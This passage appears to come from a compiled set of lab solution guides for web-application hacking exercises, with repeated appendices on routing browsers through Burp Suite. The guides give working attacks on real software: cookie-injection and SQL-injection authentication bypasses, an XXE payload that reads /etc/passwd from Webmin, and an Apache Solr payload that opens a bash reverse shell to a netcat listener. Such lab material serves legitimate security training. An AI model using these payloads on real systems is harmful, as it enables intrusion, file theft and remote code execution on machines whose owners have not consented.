Exploit DB Link: ​https://www.exploit-db.com/exploits/40631 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Navigate to the login page. The login page is located at administration/ directory. 
 
URL: ​http://r3q4fc2ojhcdod2md7c6yenrk.mumbaix.attackdefenselabs.com/administration/ 
 
 
 
Step 4: ​Reload the page and intercept the request with burp suite  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
Step 5: ​Inject the cookie in the intercepted request. 
 
Cookie ​;memberID=1; memberPassword[]=test; 
 
 
 
Step 6: ​Click on “Forward” and check the browser. 
 
 
 
 
Authentication was bypassed successfully. 
 
References:  
 
1.
Boonex Dolphin (​https://www.boonex.com/​)  
2.
Boonex Dolphin 7.3.2 - Authentication Bypass 
 (​https://www.exploit-db.com/exploits/40631​)  
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
OpenSupports 
URL 
https://attackdefense.com/challengedetails?cid=437 
Type 
Real World Webapps : Broken Authentication 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “OpenSupports exploit” and look for publicly available exploits. 
 
 
 
 
 
 
The exploit db link contains an HTML script which can be used to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/32319 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Navigate to the login page located at /admin/ 
 
URL: ​http://ee0tjqz271dt84nf9lo3swccr.mumbaix.attackdefenselabs.com/admin/ 
 
 
 
 
Step 4: ​In the Login Staff login portal, inject the SQLI payload in username and password field. 
 
Payload: ​1'or'1'='1 
 
 
 
Step 5: ​Click on the Login button. 
 
 
 
Authentication was bypassed  successfully. 
 
 
 
References:  
 
1.
Open Support (​https://www.opensupports.com/​)  
2.
OpenSupports 2.x - Authentication Bypass / Cross-Site Request Forgery 
 (​https://www.exploit-db.com/exploits/32319​)  
 
2
 
 
Name 
Online Airline Booking System 
URL 
https://www.attackdefense.com/challengedetails?cid=438  
Type 
Real World Webapps : Broken Authentication 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Online Airline Booking System exploit” and look for publicly available 
exploits. 
 
 
 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39167 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Navigate to admin panel by clicking on the “::Admin” button. 
 
 
 
 
Step 4: ​Reload the page and Intercept the GET request with burp suite.  
 
Check Appendix to learn how to configure Burp Suite. 
 
 
 
Step 5: ​Modify the request and add the LoggedIn cookie required to bypass authentication 
 
Cookie:​ LoggedIn=yes 
 
 
 
Step 6: ​Click on “forward” button and keep intercepting the subsequent requests. 
 
 
 
Step 7: ​Modify the request and inject the cookie mentioned in step 5. 
 
 
 
 
 
Step 8: ​Click on “forward” button and check the browser. 
 
 
 
Authentication was bypassed successfully. 
 
References:  
 
1.
Online Airline Booking System (​http://sourceforge.net/projects/oabs/​)  
2.
Online Airline Booking System - Multiple Vulnerabilities 
 (​https://www.exploit-db.com/exploits/39167​)  
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
Webmin 
URL 
https://www.attackdefense.com/challengedetails?cid=1529  
Type 
Real World Webapps : XML External Entity 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “webmin xxe exploit” and look for publicly available exploits. 
 
 
 
 
 
The link contains the payload required to exploit the vulnerability. 
 
Link: ​https://www.calypt.com/blog/index.php/authenticated-xxe-on-webmin/ 
 
 
 
 
Step 3:​ Navigate to the vulnerable page. The user has to authenticate in order to access the 
page. The login credentials are provided in challenge description. 
 
URL: ​http://ey6iobiiz1rlcr5qyrb5ls3vm.stager3.attackdefenselabs.com/xmlrpc.cgi 
 
Credentials: 
●
Username: ​admin 
●
Password: ​password1 
 
Login Pop up: 
 
 
 
Xmlrpc Page: 
 
 
 
Step 4: ​Reload the page to intercept the GET request with Burp Suite.  
 
To configure Burp Suite check the Appendix. 
 
 
Step 5: ​Right click and click on “Send to Repeater”. Navigate to Repeater tab 
 
 
 
 
Step 6: ​Right click and click on “Change request method” and inject the payload. 
 
Payload: 
 
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE methodCall [ 
    <!ENTITY file SYSTEM "file:///etc/passwd"> 
 
]> 
<methodCall> 
<methodName>&file;</methodName> 
</methodCall> 
 
Request Tab: 
 
 
 
Click on the Send button 
 
Response Tab: 
 
 
 
 
Passwd file has been retrieved successfully. 
 
 
 
 
References:  
 
1.
Webmin (​http://www.webmin.com/​)  
2.
Authenticated XXE on Webmin <= 1.930 
(​https://www.calypt.com/blog/index.php/authenticated-xxe-on-webmin/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
Name 
Apache Solr 
URL 
https://attackdefense.com/challengedetails?cid=1530  
Type 
Real World Webapps : XML External Entity 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​ Identifying the ip address of the target machine. 
 
Command:​ ip addr  
 
 
 
The web application is running on port 8983 on the target machine. The IP address of the target 
machine is 192.130.137.3 
 
 
 
Step 2: ​Inspect the web application. 
 
 
 
 
 
 
Step 3: ​Search on google “solr 7.0.1 exploit db” and look for any public exploit. 
 
 
 
The exploit db link contains the steps to be followed to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/43009 
 
 
 
 
 
 
 
Step 4: ​Navigate to the “/attackdefense” core selector by choosing from the drop down menu 
given at left sidebar. 
 
 
 
 
 
Step 5: ​Reload the page and intercept the GET request using burp suite. 
 
To configure Burp Suite check the Appendix. 
 
 
 
 
 
Step 6: ​Right click and select “Send to Repeater” option and navigate to “Repeater” section. 
 
 
 
Step 7: ​Add /attackdefense/config at the end of the URL path, Right click and choose “Change 
request method” as well as change the content type to “application/json” 
 
 
 
 
 
 
Step 8: ​Start a netcat listener on the attacker machine. 
 
Command: ​nc -nvlp 1234 
 
 
 
Step 9: ​Place the payload in Burp Request after changing the ip address of host machine 
 
Payload:  
 
{ 
  "add-listener" : { 
    "event":"postCommit", 
    "name":"payload", 
    "class":"solr.RunExecutableListener", 
    "exe":"sh", 
    "dir":"/bin/", 
    "args":["-c", "echo 'bash -i >& /dev/tcp/192.130.137.2/1234 0>&1' > /tmp/remote.sh;chmod 777 
/tmp/remote.sh;bash /tmp/remote.sh"] 
  } 
} 
 
Request Section: 
 
 
 
 
Response Section: 
 
 
 
 
Step 10: ​Repeat step 4 and step 5, Modify the URL by adding /attackdefense/update, Right 
click and choose “Change request method” as well as change the content type to 
“application/json” 
 
 
 
Step 11: ​Place the payload in POST parameters.  
 
Payload: ​[{"id":"test"}] 
 
Request Section: 
 
 
 
Response Section: 
 
 
 
 
 
Step 12: ​ Check the Terminal  
 
Command:​ id 
 
 
 
 
 
 
 
 
References:  
 
1.
Apache Solr (​https://lucene.apache.org/solr/​)  
2.
CVE-2017-12629 (​https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12629​)  
3.
Apache Solr 7.0.1 - XML External Entity Expansion / Remote Code Execution 
(​https://www.exploit-db.com/exploits/43009​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
